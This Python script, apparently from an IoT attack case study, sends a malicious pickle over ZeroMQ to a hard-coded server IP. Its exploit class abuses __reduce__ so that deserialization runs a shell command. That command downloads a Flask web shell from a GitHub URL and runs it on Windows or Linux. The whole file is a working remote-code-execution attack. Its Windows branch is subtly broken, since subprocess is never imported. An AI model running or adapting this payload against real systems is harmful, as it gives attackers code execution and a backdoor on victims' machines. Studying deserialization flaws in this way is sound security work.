import pickle

import zmq
import pickle
# iotIP = '172.23.155.209'
iotIP = "157.230.59.233"
port = 3003

context = zmq.Context()
print("Connecting to server...")
socket = context.socket(zmq.REQ)
# socket.connect ("tcp://localhost:%s" % port)
socket.connect("tcp://%s:%s" % (iotIP, port))
print("Sending request btyes via ZMQ client:")


class exploit:
    def __reduce__(self):
        import os
        import platform
        if platform.system() == "Windows":
            # Use a properly formatted command for subprocess.run with shell=True
            command = 'curl -o flaskWebShellApp.py https://raw.githubusercontent.com/eslamelhadedy/IoT-System-Cyber-Attack-Case-Study-02-Python-Deserialization-Attack-and-Library-Hijacking-Attack/refs/heads/main/flaskWebShellApp.py && python flaskWebShellApp.py'
            return (subprocess.run, (command, {"shell": True}))
        else:  # Assuming Linux/Unix (remote server)
            command = 'wget https://raw.githubusercontent.com/eslamelhadedy/IoT-System-Cyber-Attack-Case-Study-02-Python-Deserialization-Attack-and-Library-Hijacking-Attack/refs/heads/main/flaskWebShellApp.py && python flaskWebShellApp.py'
            return (os.system, (command,))
        



pickledata = pickle.dumps({"TEST_MD":exploit()}, protocol=pickle.HIGHEST_PROTOCOL)

# print(str(pickledata))
socket.send(pickledata)
#  Get the reply.
replyData = socket.recv()
print("received reply bytes:")
print(str(replyData))
reqDict = pickle.loads(replyData)
print("Received reply: \n %s" % str(reqDict))